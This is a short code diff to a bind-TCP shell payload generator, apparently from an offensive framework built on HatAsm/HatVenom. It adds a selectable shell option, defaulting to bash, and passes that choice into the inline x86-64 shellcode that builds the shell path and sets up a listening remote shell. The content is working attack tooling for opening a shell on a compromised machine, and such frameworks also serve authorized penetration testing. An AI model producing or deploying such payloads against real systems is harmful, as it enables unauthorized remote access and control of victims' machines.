@@ -35,6 +35,11 @@ class ShellBindTCP(HatAsm, HatVenom, Consts):
         if 'BPORT' not in options:
             return b''
 
+        if 'SHELL' in options:
+            shell = options['SHELL']
+        else:
+            shell = self.shells['bash']
+
         bport = self.convert_port(options['BPORT'])
 
         shellcode = f"""
@@ -88,7 +93,7 @@ class ShellBindTCP(HatAsm, HatVenom, Consts):
 
             xor rsi, rsi
             push rsi
-            mov rdi, 0x{self.shell.hex()}
+            mov rdi, 0x{shell.hex()}
             push rdi
             mov rdi, rsp
             xor rdx, rdx
